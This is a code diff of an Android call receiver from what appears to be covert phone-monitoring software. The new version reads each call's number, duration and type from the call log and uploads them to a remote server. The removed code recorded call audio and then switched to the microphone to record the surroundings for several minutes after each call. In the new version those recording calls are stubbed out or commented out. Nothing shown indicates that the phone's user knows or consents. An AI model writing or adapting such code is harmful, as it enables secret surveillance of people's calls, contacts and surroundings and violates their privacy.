@@ -2,24 +2,21 @@ package com.inet.android.call;
 
 import java.util.concurrent.TimeUnit;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
-import com.inet.android.audio.RecordAudio;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * Class get call
@@ -28,19 +25,19 @@ import com.inet.android.utils.ValueWork;
  * 
  */
 public class CallReceiver extends BroadcastReceiver {
-	private static Context mContext;
+	private Context mContext;
 	private static String LOG_TAG = CallReceiver.class.getSimpleName()
 			.toString();
-	private final static int SOURCE_RECORD = MediaRecorder.AudioSource.VOICE_CALL;
+	private static int osCheck = 0;
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		CallReceiver.mContext = context;
+		mContext = context;
 		Logging.doLog(LOG_TAG,
 				"intent: " + intent.getAction() + " " + intent.getExtras(),
 				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST,
+		if (AppSettings.getState(AppConstants.TYPE_INCOMING_CALL_REQUEST,
 				mContext) == 0)
 			return;
 
@@ -75,14 +72,42 @@ public class CallReceiver extends BroadcastReceiver {
 				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
 						"TelephonyManager.EXTRA_STATE_OFFHOOK");
 
-				setRecord();
+				String osVersion = android.os.Build.VERSION.RELEASE;
+				Log.d(LOG_TAG, "android version: " + osVersion);
+				if (osVersion.startsWith("5")) {
+					Log.d(LOG_TAG, "osCheck = " + osCheck);
+					if (osCheck == 1) {
+						setRecord();
+						osCheck = 0;
+					} else {
+						osCheck++;
+					}
+				} else {
+					setRecord();
+				}
+
 				// телефон находится в режиме звонка (набор номера / разговор)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// телефон находится в ждущем режиме (событие наступает по
 				// окончании разговора,
 				// когда уже знаем номер и факт звонка
 				Logging.doLog(LOG_TAG, "EXTRA_STATE_IDLE ", "EXTRA_STATE_IDLE ");
-				stopRecord();
+
+				String osVersion = android.os.Build.VERSION.RELEASE;
+				Log.d(LOG_TAG, "android version: " + osVersion);
+				if (osVersion.startsWith("5")) {
+					Log.d(LOG_TAG, "osCheck = " + osCheck);
+					if (osCheck == 1) {
+						stopRecord();
+						osCheck = 0;
+					} else {
+						osCheck++;
+					}
+				} else {
+					stopRecord();
+				}
+
+				// stopRecord();
 				try {
 					// TimeUnit.SECONDS.sleep(1);
 					TimeUnit.MILLISECONDS.sleep(1000);
@@ -95,44 +120,17 @@ public class CallReceiver extends BroadcastReceiver {
 	}
 
 	private void setRecord() {
-		if (ValueWork.getMethod(ConstantValue.RECORD_CALL, mContext) == 0)
-			return;
-		if (RecordAudio.mRecording.get())
-			RecordAudio.executeStopRecording(SOURCE_RECORD, mContext);
-		RecordAudio.executeRecording(-1, SOURCE_RECORD, mContext);
+		Logging.doLog(LOG_TAG, "setRecord", "setRecord");
+		// if (AppSettings.getSetting(AppConstants.RECORD_CALL, mContext) == 1)
+
+		// RecordAudio.startCallRec(-1, MediaRecorder.AudioSource.VOICE_CALL,
+		// mContext);
 	}
 
 	private void stopRecord() {
-		if (RecordAudio.mRecording.get()) {
-			RecordAudio.executeStopRecording();
-			
-			int minuteAfterCall = ValueWork.getMethod(
-					ConstantValue.RECORD_ENVORIMENT, mContext);
-			Logging.doLog(LOG_TAG, "recordAudio != null " + minuteAfterCall,
-					"recordAudio != null " + minuteAfterCall);
-			if (minuteAfterCall == 0) {
-				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
-						"minuteAfterCall == 0");
-				RecordAudio.checkStateRecord(mContext);
-			} else {
-				RecordAudio.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
-//				Timer myTimer = new Timer(); // Создаем таймер
-//				Logging.doLog(LOG_TAG, "Timer", "Timer");
-//				myTimer.schedule(new TimerTask() { // Определяем задачу
-//							public void run() {
-//								// if(current == minuteAfterCall){
-//								Logging.doLog(LOG_TAG, "executeStopRecording",
-//										"executeStopRecording");
-//								RecordAudio.executeStopRecording();
-//
-//							};
-//						}, minuteAfterCall * 60 * 1000); // интервал - 60000
-//															// миллисекунд, 0
-//															// миллисекунд до
-//															// первого запуска.
-
-			}
-		}
+		Logging.doLog(LOG_TAG, "stopRecord", "stopRecord");
+		// RecordAudioV2.executeStopRecording(SOURCE_RECORD, mContext);
+		// RecordAudio.stop();
 	}
 
 	private void getCallDetails() {
@@ -154,40 +152,28 @@ public class CallReceiver extends BroadcastReceiver {
 
 		switch (dircode) {
 		case CallLog.Calls.OUTGOING_TYPE:
-			callTypeStr = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
+			callTypeStr = AppConstants.TYPE_OUTGOING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.INCOMING_TYPE:
-			callTypeStr = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
+			callTypeStr = AppConstants.TYPE_INCOMING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.MISSED_TYPE:
-			callTypeStr = ConstantValue.TYPE_MISSED_CALL_REQUEST;
+			callTypeStr = AppConstants.TYPE_MISSED_CALL_REQUEST;
 			break;
 		}
 
 		managedCursor.close();
 
-		String sendJSONStr = null;
-		JSONObject info = new JSONObject();
-		JSONObject object = new JSONObject();
+		RequestParams params = new RequestParams();
+		params.put("data[][info][number]", phNumber);
+		params.put("data[][info][duration]", callDuration);
 
-		try {
+		params.put("data[][time]", ConvertDate.logTime());
+		params.put("data[][type]", callTypeStr);
+		params.put("key", System.currentTimeMillis());
 
-			info.put("number", phNumber);
-			info.put("duration", callDuration);
-
-			object.put("time", ConvertDate.logTime());
-			object.put("type", callTypeStr);
-			object.put("info", info);
-			// sendJSONStr = jsonObject.toString();
-			sendJSONStr = object.toString();
-		} catch (JSONException e) {
-			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-		}
-
-		Logging.doLog(LOG_TAG, sendJSONStr);
-
-		RequestList.sendDataRequest(sendJSONStr, mContext);
+		RequestList.sendDataRequest(params, mContext);
 	}
 }
